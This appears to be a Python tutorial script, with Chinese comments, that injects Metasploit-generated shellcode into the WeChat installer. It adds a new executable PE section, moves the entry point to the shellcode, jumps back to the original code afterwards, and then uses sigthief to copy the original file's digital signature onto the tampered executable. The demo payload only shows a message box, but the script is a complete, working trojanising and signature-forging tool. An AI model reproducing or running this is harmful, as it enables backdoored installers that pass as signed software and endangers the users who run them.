import pefile
import os
from shutil import copyfile

# 本payload由Metasploit生成
# msfvenom -a x86 --platform windows -p windows/messagebox \
# TEXT="点赞关注唐老师编程" ICON=INFORMATION EXITFUNC=process \
# TITLE="Inject Successed ....." -f python

src_path = "D:\wechat_PCDownload1100109235.exe"
exe_path = "D:\wechat_PCDownload1100109235.exe_inject.exe"
final_path = "D:\wechat_PCDownload1100109235.exe_inject_final.exe"

payload =  b""
payload += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
payload += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
payload += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
payload += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
payload += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
payload += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
payload += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
payload += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
payload += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
payload += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
payload += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
payload += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
payload += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
payload += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
payload += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
payload += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x58\x20\x20\x20\x68"
payload += b"\x2e\x2e\x2e\x2e\x68\x2e\x2e\x2e\x2e\x68\x20\x2e\x2e"
payload += b"\x2e\x68\x73\x73\x65\x64\x68\x75\x63\x63\x65\x68\x63"
payload += b"\x74\x20\x53\x68\x49\x6e\x6a\x65\x31\xdb\x88\x5c\x24"
payload += b"\x1c\x89\xe3\x68\xb3\xcc\x2e\x58\x68\xca\xa6\xb1\xe0"
payload += b"\x68\xcc\xc6\xc0\xcf\x68\xb9\xd8\xd7\xa2\x68\xb5\xe3"
payload += b"\xd4\xde\x31\xc9\x88\x4c\x24\x12\x89\xe1\x31\xd2\x6a"
payload += b"\x40\x53\x51\x52\xff\xd0"



def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) // alignment) * alignment

print("[*] 步骤一：复制源文件到目标文件")
copyfile(src_path,exe_path)

print("[*] 步骤二：调整目标可执行文件尺寸，为新建节表添加空间")
original_size = os.path.getsize(exe_path)
print("\t[+] 源文件尺寸 = %d bytes\n" % original_size)

with open(exe_path, 'a+b') as fd:
    os.ftruncate(fd.fileno(),original_size + 0x2000)
    
print("\t[+] 目标文件尺寸 = %d bytes\n" % os.path.getsize(exe_path))



SIZE_OF_SECTION_HEADER = 40

pe = pefile.PE(exe_path)

number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + SIZE_OF_SECTION_HEADER)


print("[*]步骤三：填充节表头Section Header结构体数据")
raw_size = align(0x1000, file_alignment)
virtual_size = align(0x1000, section_alignment)

raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)


characteristics = 0xE0000020    # CODE | EXECUTE | READ | WRITE

name = b".tang" + (3 * b'\x00') # Section name must be equal to 8 bytes

pe.set_bytes_at_offset(new_section_offset, name)
print("\t[+] 填充Section Name = %s" % name)

pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
print("\t[+] 填充Virtual Size = %s" % hex(virtual_size))

pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
print("\t[+] 填充Virtual Offset = %s" % hex(virtual_offset))

pe.set_dword_at_offset(new_section_offset + 16, raw_size)
print("\t[+] 填充Raw Size = %s" % hex(raw_size))

pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
print("\t[+] 填充Raw Offset = %s" % hex(raw_offset))

pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))

pe.set_dword_at_offset(new_section_offset + 36, characteristics)
print("\t[+] 填充Characteristics = %s\n" % hex(characteristics))


print("[*]步骤四：修改文件头 File Headers")
pe.FILE_HEADER.NumberOfSections += 1
print("\t[+] 修改节表数 Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections)
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
print("\t[+] 修改映像尺寸 Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage)

pe.write(exe_path)

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
new_ep = pe.sections[last_section].VirtualAddress

oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
print("\t[+] 原代码入口点 = %s" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
print("\t[+] 新代码入口点 = %s" % hex(pe.sections[last_section].VirtualAddress))

#执行完payload后，使用JMP(机器码 e9) 目标地址(原入口) - 源地址(JMP指令地址)- 5 
payload += b"\xe9" + (oep - (new_ep + len(payload)) - 5).to_bytes(4,byteorder='little',signed=True) 


print("[*]步骤五: 向PE注入payload ")

raw_offset = pe.sections[last_section].PointerToRawData
pe.set_bytes_at_offset(raw_offset, payload)


pe.write(exe_path)
print("\t[+] PE文件保存成功,")


print("[*]步骤六: 附加流程，开始执行PE签名操作")
import subprocess

python_path =f"{os.getcwd()}/sigthief.py"
command = f"python {python_path} -i {src_path} -t {exe_path} -o {final_path}"

ret = subprocess.run(command,shell=True,encoding="gbk",timeout=10)

if ret.returncode == 0:
    print("\t[+] 签名成功，点赞关注唐老师")
else:
    print("\t[+] 签名失败",ret)





